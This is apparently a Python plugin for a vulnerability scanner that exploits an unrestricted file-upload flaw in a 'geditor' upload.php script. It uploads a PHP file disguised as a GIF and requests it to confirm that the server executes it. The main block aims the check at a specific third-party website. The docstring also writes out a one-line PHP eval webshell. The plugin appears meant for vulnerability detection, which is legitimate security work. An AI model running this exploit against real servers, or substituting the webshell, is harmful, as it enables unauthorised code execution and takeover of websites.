#!/usr/bin/env python
# -*- coding: utf-8 -*-
# __Author__ = angel
# _PlugName_ = gedior upload
import re


def curl3(
        url, post=None, raw=None, proxy=None, method=None,
        referer=None, cookie=None,
        user_agent='Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
        header=None, max_time=0, connect_timeout=10, retry=2,
        retry_delay=1, upfile=None):
    u"""
        Curl3: 支持上传文件,字典形式 header, 兼容旧 curl2
        eg:
        1. 发送字典头部

        headers = {
            'User-Agent': 'Mozilla/4.0',
            'Content-Type': 'text/html'
        }
        code, head, res, errcode, _ = curl3(url, header=headers)
        2. 发送字典 post data

            post_data = {
                'name': 'Medici.Yan',
                'password': 'mypassword'
            }
            code, head, res, errcode, _ = curl3(url, post=post_data)
        3. 上传文件

        假设有表单如下:
            <form id="frmUpload" enctype="multipart/form-data"
            action="http://test.com/upload.php" method="post">up
                <input type="file" name="image" size="50" />
                <input type="file" name="image2" size="50" />
                <input type="text" name="token"  value="348"/>
                <input type="text" name="work"  value="upload"/>
                <input id="btnUpload" type="submit" value="Upload">
            </form>

        image 和 image2 都为文件类型

        代码如下：
            文件部分:
            files = [
                ('image', ('1.gif', 'GIF89axxxx', 'image/gif')),
                ('image2', ('2.jpg', '2.jpg的内容', 'image/jpeg'))
            ]
            表单中其它部分:
            post_data = "token=348&work=upload&submit=Upload"
            code, head, res, errcode, _ = curl3(
                url, upfile=files, post=post_data)

        Tips:
            上传要求对服务器不产生任何危害

            推荐上传文件内容为:
                <?php echo md5(0x2333333);unlink(__FILE__); ?>
            unlink 函数会在访问该 php 脚本后自删除本文件

            不推荐上传:
                1. <?php phpinfo(); ?>
                2. <?php eval($_POST[cmd]);?>;

    """
    header_str = ""
    payload = ""

    """ support dict header"""
    if isinstance(header, dict):
        for i in header.keys():
            header_str += "%s: %s\r\n" % (i, header.get(i))
    else:
        header_str = header

    """ support dict post"""
    if isinstance(post, dict):
        import urllib
        payload = urllib.urlencode(post)
    else:
        payload = post
    if upfile:
        # The upfile like this.
        #
        # upfile = [
        # ('uploadfile', (
        #     '3.php',
        #     "GIF89a\r\n<?php echo md5(0x2333333);unlink(__FILE__); ?>",
        #     'image/gif')),
        # ('file2', (
        #     '2.php',
        #     "GIF89a\r\n<?php echo md5(0x2333333);unlink(__FILE__); ?>",
        #     'image/gif'))]
        if isinstance(upfile, list):
            post = payload
            payload = ""  # 如果是上传文件的话, post部分要重新处理
            boundary = "--Oo0oOoo00"
            for i in range(len(upfile)):
                payload += "--%s\r\n" % boundary
                payload += "Content-Disposition: form-data;"
                payload += " name=\"%s\"; " % upfile[i][0]
                payload += "filename=\"%s\"\r\n" % upfile[i][1][0]
                payload += "Content-Type: %s\r\n\r\n" % upfile[i][1][2]
                payload += """%s\r\n""" % upfile[i][1][1]

            if post:
                postlist = post.split('&')
                for i in range(len(postlist)):
                    if postlist[i]:
                        key, val = postlist[i].split('=')
                        payload += "--%s\r\n" % boundary
                        payload += 'Content-Disposition: form-data; '
                        payload += 'name="%s"\r\n\r\n' % key
                        payload += "%s\r\n" % val
            payload += "--%s--\r\n" % boundary
            if header_str is None:
                header_str = ""
            if header_str.endswith('\r\n\r\n'):
                header_str = header_str.replace('\r\n\r\n', '\r\n')
            elif header_str.endswith('\r\n'):
                pass
            elif header_str == "":
                pass
            else:
                header_str += '\r\n'

            header_str += 'Content-Type: multipart/form-data; '
            header_str += 'boundary=%s\r\n' % boundary
            # header_str += '\r\n'
    return curl.curl2(
        url, post=payload, raw=raw, proxy=proxy, method=method,
        referer=referer, cookie=cookie, user_agent=user_agent,
        header=header_str, max_time=max_time,
        connect_timeout=connect_timeout,
        retry=2, retry_delay=1)


def assign(service, arg):
    if service == 'geditor':
        return True, arg


def audit(arg):
    upfile = 'geditor/upload.php'
    f = [
        ('image', (
            '5e2e9b556d77c86ab48075a94740b6f6.php',
            "GIF89a\r\n<?php echo md5(0x2333333);unlink(__FILE__); ?>",
            'image/gif'))]
    # [('form 中 file 的 name', ('文件名', '文件内容', '文件 MIME'))]
    # 每个元素是一个文件
    #
    # post_data = "obj=geditor_wr_content&token=348&work=upload"
    # 如果使用 字典 形式传 post
    post_data = {
        'obj': 'geditor_wr_content',
        'token': '348',
        'work': 'upload',
        'submit': 'Upload'
    }
    code, head, res, errcode, _ = curl3(arg + upfile, post=post_data, upfile=f)
    # ########### 使用 curl2 上传文件如下 #######################
    # headers = {'Content-Type': 'multipart/form-data; boundary=----Oo0oOoo00'}
    # header_str = ""
    # for i in headers.keys():
    #     header_str += "%s: %s\r\n" % (i, headers.get(i))
    # payload = ""
    # payload += "------Oo0oOoo00\r\n"
    # payload += "Content-Disposition: form-data; name=\"image\"; filename=\"5e2e9b556d77c86ab48075a94740b6f6.php\"\r\n"
    # payload += "Content-Type: image/gif\r\n\r\n"
    # payload += "GIF89a\r\n<?php echo md5(0x2333333);unlink(__FILE__); ?>\r\n"
    # payload += "------Oo0oOoo00\r\n"
    # payload += 'Content-Disposition: form-data; name="obj"\r\n\r\n'
    # payload += "geditor_wr_content\r\n"
    # payload += "------Oo0oOoo00\r\n"
    # payload += 'Content-Disposition: form-data; name="token"\r\n\r\n'
    # payload += "348\r\n"
    # payload += "------Oo0oOoo00\r\n"
    # payload += 'Content-Disposition: form-data; name="work"\r\n\r\n'
    # payload += "upload\r\n"
    # payload += "------Oo0oOoo00--\r\n"
    # code, head, res, errcode, _ = curl.curl2(
    #     arg + upfile, post=payload, header=header_str)
    # ############ 使用 curl2 上传结束 #####################
    # ############# 解析返回后的页面 #################
    if res:
        pattern = re.search(r'insert_image_preview\(\"(.+)\"\)\;', res)
        if pattern:
            shell = arg + 'geditor' + pattern.group(1)
            code2, head2, res2, errcode2, _ = curl3(shell)
            if "5a8adb32edd60e0cfb459cfb38093755" in res2:
                security_hole(arg + upfile)

if __name__ == '__main__':
    from dummy import *
    audit(assign('geditor', 'http://msgr2.talknow.co.kr/')[1])
